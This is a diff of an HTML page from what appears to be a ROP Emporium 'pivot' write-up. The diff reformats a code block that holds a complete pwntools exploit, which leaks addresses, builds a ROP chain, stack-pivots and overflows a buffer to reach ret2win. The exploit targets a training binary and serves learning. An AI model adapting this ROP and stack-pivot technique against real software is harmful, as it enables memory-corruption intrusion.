@@ -62,54 +62,39 @@
 <div>
     <img src="../imgs/rop_emporium/pivot3.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./pivot')
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./pivot'</span><span style="color: #839496">)</span>
 
-p = elf.process()
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
 
-p.recvuntil('pivot: ')
-leak = int(p.recvuntil('\n').strip(),16)    #Get Address of chain location in memory
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'pivot: '</span><span style="color: #839496">)</span>
+<span style="color: #839496">leak</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'\n'</span><span style="color: #839496">)</span><span style="color: #586e75">.</span><span style="color: #839496">strip(),</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>    <span style="color: #586e75; font-style: italic">#Get Address of chain location in memory</span>
 
-PUTS_PLT = p64(elf.plt['puts'])
-PUTS_GOT = p64(elf.got['puts'])
-pop_rdi = p64(0x400a33)
-main = p64(elf.sym['main'])
-leave = p64(0x4008ef)
+<span style="color: #839496">PUTS_PLT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">plt[</span><span style="color: #2aa198">'puts'</span><span style="color: #839496">])</span>
+<span style="color: #839496">PUTS_GOT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">got[</span><span style="color: #2aa198">'puts'</span><span style="color: #839496">])</span>
+<span style="color: #839496">pop_rdi</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400a33</span><span style="color: #839496">)</span>
+<span style="color: #839496">main</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'main'</span><span style="color: #839496">])</span>
+<span style="color: #839496">leave</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4008ef</span><span style="color: #839496">)</span>
 
-chain = b'A'*8 + pop_rdi + PUTS_GOT + PUTS_PLT + main   #Leak an address from libc using puts_plt. This gives us ret2win address
-                                                        #Finally call main again so that we can abuse the buffer overflow again
-pivot = b'A'*32 + p64(leak) + leave                     #Stack pivot onto chain using the chain leak, and a leave gadget
+<span style="color: #839496">chain</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">8</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">PUTS_GOT</span> <span style="color: #586e75">+</span> <span style="color: #839496">PUTS_PLT</span> <span style="color: #586e75">+</span> <span style="color: #839496">main</span>   <span style="color: #586e75; font-style: italic">#Leak an address from libc using puts_plt. This gives us ret2win address</span>
+                                                        <span style="color: #586e75; font-style: italic">#Finally call main again so that we can abuse the buffer overflow again</span>
+<span style="color: #839496">pivot</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">32</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(leak)</span> <span style="color: #586e75">+</span> <span style="color: #839496">leave</span>                     <span style="color: #586e75; font-style: italic">#Stack pivot onto chain using the chain leak, and a leave gadget</span>
 
-p.sendlineafter('> ',chain)
-p.sendlineafter('> ',pivot)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendlineafter(</span><span style="color: #2aa198">'&gt; '</span><span style="color: #839496">,chain)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendlineafter(</span><span style="color: #2aa198">'&gt; '</span><span style="color: #839496">,pivot)</span>
 
-p.recvuntil('Thank you!\n')
-data = p.recvline().strip()
-libc_leak = u64(data.ljust(8,b'\x00'))
-libc_base = libc_leak + 0x184a60
-ret2win = p64(libc_base + 0xa81)                      #Calculate address of ret2win
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'Thank you!\n'</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvline()</span><span style="color: #586e75">.</span><span style="color: #839496">strip()</span>
+<span style="color: #839496">libc_leak</span> <span style="color: #586e75">=</span> <span style="color: #839496">u64(data</span><span style="color: #586e75">.</span><span style="color: #839496">ljust(</span><span style="color: #2aa198">8</span><span style="color: #839496">,</span><span style="color: #2aa198">b'\x00'</span><span style="color: #839496">))</span>
+<span style="color: #839496">libc_base</span> <span style="color: #586e75">=</span> <span style="color: #839496">libc_leak</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">0x184a60</span>
+<span style="color: #839496">ret2win</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(libc_base</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">0xa81</span><span style="color: #839496">)</span>                      <span style="color: #586e75; font-style: italic">#Calculate address of ret2win</span>
 
-p.sendlineafter('> ',b'AAAA')
-p.sendlineafter('> ',b'A'*40 + ret2win)               #Call ret2win to write out the flag
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendlineafter(</span><span style="color: #2aa198">'&gt; '</span><span style="color: #839496">,</span><span style="color: #2aa198">b'AAAA'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendlineafter(</span><span style="color: #2aa198">'&gt; '</span><span style="color: #839496">,</span><span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">40</span> <span style="color: #586e75">+</span> <span style="color: #839496">ret2win)</span>               <span style="color: #586e75; font-style: italic">#Call ret2win to write out the flag</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
